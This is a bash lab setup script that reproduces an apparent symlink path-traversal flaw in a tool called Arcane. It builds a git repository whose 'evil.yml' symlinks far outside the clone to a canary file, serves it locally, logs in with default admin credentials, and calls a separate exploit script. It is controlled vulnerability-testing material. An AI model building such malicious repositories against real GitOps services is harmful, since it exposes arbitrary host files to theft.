#!/usr/bin/env bash
set -euo pipefail

ARCANE_URL="http://127.0.0.1:${PORT:-3552}"
GIT_PORT=9418
TARGET="${TARGET:-/lab/canary.txt}"

mkdir -p /lab/srv
printf 'services: {}\n# CANARY: this file is OUTSIDE the cloned repo (%s)\n' "$(date -u +%FT%TZ)" > /lab/canary.txt

git init -q -b master /lab/tree
printf 'services: {}\n' > /lab/tree/compose.yml
ln -s "$(printf '../%.0s' $(seq 1 12))${TARGET#/}" /lab/tree/evil.yml
git -C /lab/tree add -A
GIT_AUTHOR_NAME=poc GIT_AUTHOR_EMAIL=poc@example.invalid \
GIT_COMMITTER_NAME=poc GIT_COMMITTER_EMAIL=poc@example.invalid \
  git -C /lab/tree commit -q -m "compose + gitops config"
git clone -q --bare /lab/tree /lab/srv/evil.git

git daemon --reuseaddr --listen=127.0.0.1 --port="$GIT_PORT" \
  --base-path=/lab/srv --export-all --enable=upload-pack &

/opt/arcane/arcane > /lab/arcane.log 2>&1 &

for _ in $(seq 1 60); do
  curl -fsS "$ARCANE_URL/api/health" >/dev/null 2>&1 && break
  sleep 1
done
curl -fsS "$ARCANE_URL/api/health" >/dev/null || { echo "Arcane did not start"; tail -40 /lab/arcane.log; exit 1; }

ARCANE_TOKEN=$(curl -fsS -X POST -H 'Content-Type: application/json' \
  -d '{"username":"arcane","password":"arcane-admin"}' \
  "$ARCANE_URL/api/auth/login" | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["token"])')
export ARCANE_URL ARCANE_TOKEN I_HAVE_AUTHORIZATION=yes

echo "[*] Arcane: $ARCANE_URL  Canary: $TARGET"
/opt/poc/exploit.sh "git://127.0.0.1:${GIT_PORT}/evil.git"
